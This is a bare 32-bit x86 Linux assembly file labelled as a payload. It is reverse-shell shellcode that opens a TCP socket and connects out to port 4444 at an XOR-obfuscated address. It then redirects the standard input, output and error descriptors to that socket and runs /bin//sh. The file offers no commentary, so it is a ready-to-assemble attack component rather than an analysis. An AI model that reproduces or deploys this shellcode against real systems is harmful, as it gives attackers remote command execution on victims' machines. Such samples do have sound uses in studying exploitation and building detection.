BITS 32
global _payload
_payload:

xor eax,eax
xor ebx,ebx
cdq

push byte 0x6
push byte 0x1
push byte 0x2
mov ecx,esp
inc bl
mov al,102
int 0x80
mov esi,eax

push edx
mov ecx, 0x0111117f
xor ecx, 0x10111101
inc ecx
push cx
;push long 0xfe01a8c0
push word 0x5c11
push word 0x02
mov eax,esp
push edx
push byte 0x10
push eax
push esi
mov ecx,esp
mov bl,0x3
xor eax,eax
mov al,102
xor edx,edx
int 0x80

xor ecx,ecx
mov cl,3

loop:
dec cl
mov al,63
int 0x80
jnz loop

push edx
push long 0x68732f2f
push long 0x6e69622f
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,0x0b
int 0x80

xor ebx,ebx
mov al,1
int 0x80